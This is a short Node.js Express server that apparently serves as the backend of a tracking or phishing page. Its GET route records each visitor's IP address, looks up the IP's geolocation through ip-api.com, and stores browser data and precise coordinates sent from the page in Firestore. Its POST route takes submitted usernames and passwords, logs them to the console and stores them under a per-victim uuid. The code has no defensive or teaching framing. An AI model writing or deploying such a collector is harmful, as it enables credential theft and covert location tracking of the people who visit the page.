const cors = require('cors');
const express = require('express');
const axios = require('axios');
const { Firestore } = require('firebase-admin/firestore');

const app = express();

app.use(cors({ origin: true }));
app.set('trust proxy', true);

app.get('/', async (req, res) => {
  const uuid = req.query.uuid;
  console.log(req.query);

  const firestore = new Firestore();
  const ref = firestore.doc(`data/${uuid}`);
  const snapshot = await ref.get();

  const remoteIp = req.headers['x-forwarded-for'] || 'unknown';

  const metaData = req.query.browser ? req.query.browser : 'unknown';

  const preciseCoords = req.query.preciseCoords ? req.query.preciseCoords : 'unknown';

  let data = {};
  if (remoteIp !== 'unknown') {
    const response = await axios.get(`http://ip-api.com/json/${remoteIp}`);
    data = response.data;
  }

  console.log({
    uuid: uuid,
    time: Date.now(),
    ipData: { ip: remoteIp, ...data },
    preciseCoords: preciseCoords,
    browserData: metaData,
  });

  if (!snapshot.exists) {
    await ref.set({
      time: Date.now(),
      ipData: { ip: remoteIp, ...data },
      preciseCoords: preciseCoords,
      browserData: metaData,
    });
  } else {
    await ref.update({
      time: Date.now(),
      ipData: { ip: remoteIp, ...data },
      preciseCoords: preciseCoords,
      browserData: metaData,
    });
  }
  res.send();
});

app.post('/', async (req, res) => {
  const { user, pass, uuid } = req.body;

  console.log(user, pass, uuid);

  const firestore = new Firestore();
  const ref = firestore.doc(`data/${uuid}`);
  const snapshot = await ref.get();

  if (!snapshot.exists) {
    await ref.set({
      creds: {
        user,
        pass,
      },
    });
  } else {
    await ref.update({
      creds: {
        user,
        pass,
      },
    });
  }

  res.send();
});

module.exports = app;
